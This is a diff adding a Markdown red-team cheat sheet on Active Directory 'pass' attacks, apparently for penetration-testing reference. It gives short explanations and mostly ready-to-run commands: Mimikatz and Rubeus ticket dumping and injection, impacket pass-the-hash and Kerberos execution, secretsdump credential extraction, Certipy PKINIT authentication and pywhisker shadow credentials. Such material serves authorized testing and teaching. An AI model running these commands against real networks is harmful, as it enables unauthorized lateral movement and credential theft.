@@ -1,0 +1,126 @@
+# Pass Attacks
+
+Authenticate to services using captured credentials without cracking: NTLM hashes for PTH, Kerberos tickets for PTT, or certificates for PKINIT. Each technique bypasses the need to know the plaintext password.
+
+## Pass-the-Hash (PTH)
+
+NTLM authentication uses a challenge-response protocol that only requires the hash, not the plaintext. Works against SMB, WinRM, LDAP, and most Windows remote protocols.
+
+> **UAC restriction:** For non-RID-500 local accounts, UAC remote token filtering blocks most lateral movement unless `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to 1. Domain accounts and the built-in Administrator (RID 500) are not affected.
+
+```bash
+# psexec: creates a service, gives SYSTEM, very noisy
+psexec.py $DOMAIN/$USER@$IP -hashes :$HASH
+
+# wmiexec: no service created, runs as the user, quieter
+wmiexec.py $DOMAIN/$USER@$IP -hashes :$HASH
+
+# smbexec: semi-interactive, no binary dropped
+smbexec.py $DOMAIN/$USER@$IP -hashes :$HASH
+
+# evil-winrm: requires WinRM (port 5985)
+evil-winrm -i $IP -u $USER -H $HASH
+
+# nxc: verify access or run commands
+nxc smb $IP -u $USER -H $HASH
+nxc smb $IP -u $USER -H $HASH -x "whoami"
+nxc winrm $IP -u $USER -H $HASH -x "whoami"
+```
+
+## Pass-the-Ticket (PTT)
+
+Inject a valid Kerberos ticket into your session and authenticate as that user to any Kerberos-protected service: useful with stolen TGTs or TGSes.
+
+```powershell
+# Mimikatz: export all tickets from LSASS
+privilege::debug
+sekurlsa::tickets /export
+# Produces .kirbi files in current directory
+
+# Mimikatz: inject a ticket into current session
+kerberos::ptt ticket.kirbi
+
+# Rubeus: dump tickets (base64)
+Rubeus.exe dump /nowrap
+
+# Rubeus: inject ticket
+Rubeus.exe ptt /ticket:<base64_ticket>
+
+# Rubeus: dump and inject in one step
+Rubeus.exe tgtdeleg /nowrap
+```
+
+```bash
+# Linux: set ccache file and use with impacket
+export KRB5CCNAME=/path/to/ticket.ccache
+psexec.py -k -no-pass $DOMAIN/$USER@host.$DOMAIN
+wmiexec.py -k -no-pass $DOMAIN/$USER@host.$DOMAIN
+nxc smb $IP -u $USER --use-kcache
+
+# Convert kirbi ↔ ccache
+ticketConverter.py ticket.kirbi ticket.ccache
+ticketConverter.py ticket.ccache ticket.kirbi
+```
+
+## Overpass-the-Hash
+
+Convert an NTLM hash into a Kerberos TGT. The resulting ticket can be used for Kerberos authentication instead of NTLM: avoids NTLM-blocked environments.
+
+```bash
+# impacket: get TGT using NTLM hash
+getTGT.py $DOMAIN/$USER -hashes :$HASH -dc-ip $IP
+export KRB5CCNAME=$USER.ccache
+psexec.py -k -no-pass $DOMAIN/$USER@host.$DOMAIN
+```
+
+```powershell
+# Rubeus: request TGT and inject into current session
+Rubeus.exe asktgt /user:$USER /rc4:$HASH /ptt
+
+# Rubeus: request TGT, output base64 for later use
+Rubeus.exe asktgt /user:$USER /rc4:$HASH /outfile:$USER.kirbi
+```
+
+## Pass-the-Certificate / PKINIT
+
+Authenticate using a certificate (PFX) instead of a password or hash. Required when you've obtained a certificate via ADCS abuse or shadow credentials and want to convert it to a usable TGT or NTLM hash.
+
+```bash
+# gettgtpkinit (Linux): get TGT from certificate
+python3 gettgtpkinit.py $DOMAIN/$USER -cert-pfx $USER.pfx -pfx-pass $PASSWORD $USER.ccache
+export KRB5CCNAME=$USER.ccache
+secretsdump.py -k -no-pass $DOMAIN/$USER@$DC_HOST
+
+# Certipy: authenticate and get NT hash directly
+certipy auth -pfx $USER.pfx -dc-ip $IP
+
+# Certipy: get TGT without hash (for Kerberos-only)
+certipy auth -pfx $USER.pfx -dc-ip $IP -no-hash
+
+# Certipy: LDAP shell via Schannel (when PKINIT unavailable)
+certipy auth -pfx $USER.pfx -dc-ip $IP -ldap-shell
+```
+
+```powershell
+# Rubeus: request TGT with certificate and inject
+Rubeus.exe asktgt /user:administrator /certificate:$B64 /password:$PASSWORD /ptt
+
+# Rubeus: save to file instead
+Rubeus.exe asktgt /user:administrator /certificate:$B64 /password:$PASSWORD /outfile:admin.kirbi
+```
+
+### Shadow Credentials via pywhisker
+
+If you have `WriteProperty` on `msDS-KeyCredentialLink`, add a certificate credential to the target account without changing the password.
+
+```bash
+# Add shadow credential (generates pfx + password)
+pywhisker -d $DOMAIN -u $USER -p $PASSWORD --target $TARGET --action add --dc-ip $IP
+
+# Use the generated PFX to get a TGT
+getTGT.py $DOMAIN/$TARGET -pfx-base64 $B64 -dc-ip $IP
+export KRB5CCNAME=$TARGET.ccache
+
+# Or use Certipy directly
+certipy shadow auto -u $USER@$DOMAIN -p $PASSWORD -account $TARGET -dc-ip $IP
+```
